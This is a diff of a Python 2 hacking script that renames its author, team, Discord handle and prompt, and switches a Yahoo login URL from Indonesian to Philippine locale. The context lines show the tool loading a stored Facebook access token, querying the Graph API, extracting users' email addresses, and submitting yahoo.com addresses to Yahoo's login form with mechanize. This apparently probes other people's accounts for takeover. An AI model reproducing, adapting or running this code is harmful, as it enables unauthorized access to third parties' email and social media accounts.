@@ -1,5 +1,5 @@
 # encoding=utf8
-# Author: Crypton
+# Author: Marx Chryz
 import requests, json, os, re, sys, mechanize, urllib, hashlib
 reload(sys)
 sys.setdefaultencoding('utf8')
@@ -24,8 +24,8 @@ def about():
     \033[1;32;40mMade for   \033[37mCryptoExpose
     \033[1;32;40mVersion    \033[37mv 1.0
     \033[1;32;40mDate       \033[37m05/19/2019
-    \033[1;32;40mTeam       \033[37mCrypton
-    \033[1;32;40mDiscord    \033[37mCryptonPennywise#2914
+    \033[1;32;40mTeam       \033[37mWala, paampon po
+    \033[1;32;40mDiscord    \033[37mCrypton#9827
 
 
 
@@ -93,7 +93,7 @@ def start(token):
             kunci = re.compile(r'@.*')
             cari = kunci.search(z['email']).group()
             if 'yahoo.com' in cari:
-                br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
+                br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=ph&.lang=ph-ID&.done=https://ph.yahoo.com")
                 br._factory.is_html = True
                 br.select_form(nr=0)
                 br["username"] = z['email']
@@ -212,7 +212,7 @@ def logout():
     main()
 def main():
     try:
-        cmd = raw_input('\033[1;32;40mM412x \033[39m>>> ')
+        cmd = raw_input('\033[1;32;40mCrypton \033[39m>>> ')
         if cmd.lower() == 'login':
             try:
                 r = requests.get('https://graph.facebook.com/me?access_token=' + open('cookie/token.log').read())
